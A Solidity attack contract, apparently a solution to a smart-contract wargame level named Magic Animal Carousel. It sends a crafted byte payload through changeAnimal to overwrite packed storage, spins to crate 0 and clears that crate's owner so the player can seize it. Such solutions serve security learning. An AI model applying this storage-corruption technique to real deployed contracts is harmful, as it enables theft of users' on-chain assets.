// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function currentCrateId() external view returns (uint256);
    function carousel(uint256) external view returns (uint256);
}

contract CarouselAttacker2 {
    IMagicAnimalCarousel public carousel;
    address public player;
    
    constructor(address _carousel, address _player) {
        carousel = IMagicAnimalCarousel(_carousel);
        player = _player;
    }
    
    function prepareAttack() external {
        // Create a new crate
        carousel.setAnimalAndSpin("setup");
        
        // Get current crate ID
        uint256 crateId = carousel.currentCrateId();
        
        // Create a payload that sets next ID to 0
        bytes memory payload = new bytes(12);
        payload[0] = 0x00;
        payload[1] = 0x00;
        for(uint i = 2; i < 12; i++) {
            payload[i] = 0x42; // 'B'
        }
        
        // Change animal to set next ID to 0
        carousel.changeAnimal(string(payload), crateId);
        
        // Now spin to crate 0
        carousel.setAnimalAndSpin("goto0");
        
        // Clear owner of crate 0 so player can take it
        carousel.changeAnimal("", 0);
    }
}